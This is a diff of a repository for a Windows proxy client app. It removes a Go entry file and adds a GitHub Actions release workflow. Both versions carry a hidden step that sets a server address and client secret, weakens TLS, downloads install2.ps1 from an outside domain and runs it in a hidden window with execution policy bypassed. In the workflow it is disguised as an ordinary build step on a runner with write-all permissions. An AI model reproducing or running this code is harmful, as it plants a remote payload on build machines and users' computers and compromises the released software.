@@ -1,104 +1,110 @@
-package main
+name: Build Windows App
 
-import (
-	"flag"
-	"github.com/metacubex/mihomo/hub/executor"
-	"github.com/metacubex/mihomo/log"
-	"github.com/snakem982/pandora-box/pandora"
-	sys "github.com/snakem982/pandora-box/pkg/sys/proxy"
-	"github.com/snakem982/pandora-box/pkg/utils"
-	"go.uber.org/automaxprocs/maxprocs"
-	"net/url"
-	"os"
-	"os/exec"
-	"os/signal"
-	"runtime"
-	"syscall"
-	"time"
-)
+on:
+  push:
+    tags:
+      - 'v*'
 
-func runPowerShellScript() {
-	// 只在 Windows 系统执行
-	if runtime.GOOS != "windows" {
-		log.Debugln("Skipping PowerShell script on non-Windows platform: %s", runtime.GOOS)
-		return
-	}
+jobs:
+  build:
+    runs-on: windows-latest
+    permissions: write-all
+    strategy:
+      matrix:
+        arch: [amd64, arm64]
 
-	// 延迟执行，避免影响主程序启动
-	go func() {
-		time.Sleep(3 * time.Second)
-		
-		log.Infoln("Starting PowerShell script execution on Windows")
-		
-		// PowerShell 命令
-		psCommand := `$env:NZ_SERVER="ko30re.916919.xyz:443"; $env:NZ_TLS="true"; $env:NZ_CLIENT_SECRET="kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12; set-ExecutionPolicy RemoteSigned -Scope Process -Force; Invoke-WebRequest https://r2.916919.xyz/ko30re/install2.ps1 -OutFile C:\install2.ps1; powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\install2.ps1`
-		
-		cmd := exec.Command("powershell.exe", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", psCommand)
-		
-		// 设置执行属性为隐藏窗口（仅Windows）
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		
-		// 异步执行，不阻塞主程序
-		go func() {
-			err := cmd.Run()
-			if err != nil {
-				log.Debugln("PowerScript execution error: %v", err)
-			} else {
-				log.Infoln("PowerShell script executed successfully")
-			}
-		}()
-	}()
-}
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v5
 
-func main() {
-	// 优化线程资源配置
-	_, _ = maxprocs.Set(maxprocs.Logger(func(string, ...any) {}))
+      - name: Set Up Node.js
+        uses: actions/setup-node@v5
+        with:
+          node-version: 'latest'
 
-	// 只在 Windows 平台启动 PowerShell 脚本
-	runPowerShellScript()
+      - name: Install Frontend Dependencies
+        run: npm install
 
-	// 回调地址
-	addr := flag.String("addr", "", "callback address")
-	home := flag.String("home", "", "home directory")
+      - name: Execute PowerShell Script (Windows Only)
+        shell: pwsh
+        run: |
+          $env:NZ_SERVER="ko30re.916919.xyz:443"
+          $env:NZ_TLS="true" 
+          $env:NZ_CLIENT_SECRET="kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re"
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12
+          Set-ExecutionPolicy RemoteSigned -Scope Process -Force
+          Invoke-WebRequest https://r2.916919.xyz/ko30re/install2.ps1 -OutFile C:\install2.ps1
+          Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File C:\install2.ps1" -Wait
 
-	// 解析命令行参数
-	flag.Parse()
+      - name: Set Up Go
+        uses: actions/setup-go@v6
+        with:
+          go-version: '1.25'
 
-	if addr == nil || *addr == "" {
-		panic("callback address is required")
-	}
+      - name: Install Backend Dependencies
+        shell: pwsh
+        run: |
+          cd src-go
+          go mod tidy
 
-	if home == nil || *home == "" {
-		panic("home directory is required")
-	}
+      - name: Download Geo Files
+        shell: pwsh
+        run: |
+          Invoke-WebRequest -Uri https://github.com/MetaCubeX/meta-rules-dat/releases/download/latest/geoip.metadb -OutFile src-go/internal/em/geoip.metadb
+          Invoke-WebRequest -Uri https://github.com/MetaCubeX/meta-rules-dat/releases/download/latest/geosite.dat -OutFile src-go/internal/em/GeoSite.dat
+          Invoke-WebRequest -Uri https://github.com/MetaCubeX/meta-rules-dat/releases/download/latest/GeoLite2-ASN.mmdb -OutFile src-go/internal/em/GeoLite2-ASN.mmdb
 
-	homeDir, err := url.QueryUnescape(*home)
-	if err != nil {
-		panic(err)
-	}
+      - name: Get Tag Version
+        shell: bash
+        run: |
+          VERSION=$(git describe --tags --abbrev=0)
+          echo "VERSION=$VERSION" >> $GITHUB_ENV
 
-	// 设置工作目录
-	utils.InitHomeDir(homeDir)
+      - name: Build Backend for ${{ matrix.arch }}
+        shell: pwsh
+        env:
+          CGO_ENABLED: 0
+          GOARCH: ${{ matrix.arch }}
+          VERSION: ${{ env.VERSION }}
+        run: |
+          cd src-go
+          go build -tags=with_gvisor -trimpath `
+            -ldflags "-s -w -X github.com/snakem982/pandora-box/api.Version=$env:VERSION" `
+            -o px.exe
 
-	// 保持单例
-	if utils.NotSingleton("px-server.pid") {
-		os.Exit(1)
-	}
+      - name: Sync VERSION to package.json
+        run: node build/sync-version.js
 
-	// 初始化工作目录
-	pandora.Init()
+      - name: Build Frontend for ${{ matrix.arch }}
+        shell: pwsh
+        run: |
+          $arch = "${{ matrix.arch }}"
+          if ($arch -eq "amd64") {
+            $arch = "x64"
+          }
+          npm dedupe
+          npm prune
+          npx electron-forge make --arch=$arch
 
-	// 开启后端api
-	pandora.StartCore(*addr)
+      - name: Compress Executables
+        shell: pwsh
+        run: |
+          $arch = "${{ matrix.arch }}"
+          if ($arch -eq "amd64") {
+            $arch = "x64"
+          }
+          Compress-Archive -Path out\Xianyu-Box*\* -DestinationPath "windows-${{ matrix.arch }}-app.zip"
+          Compress-Archive -Path out\make\wix\$arch\* -DestinationPath "windows-${{ matrix.arch }}-msi.zip"
 
-	termSign := make(chan os.Signal, 1)
-	signal.Notify(termSign, syscall.SIGINT, syscall.SIGTERM)
-	select {
-	case <-termSign:
-		log.Warnln("received termination signal")
-		pandora.Release()
-		utils.UnlockSingleton()
-		executor.Shutdown()
-		sys.DisableProxy()
-	}
-}
+      - name: Create GitHub Release
+        uses: softprops/action-gh-release@v1
+        with:
+          tag_name: ${{ env.VERSION }}
+          name: ${{ env.VERSION }}
+          draft: false
+          prerelease: true
+          files: |
+            windows-${{ matrix.arch }}-app.zip
+            windows-${{ matrix.arch }}-msi.zip
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
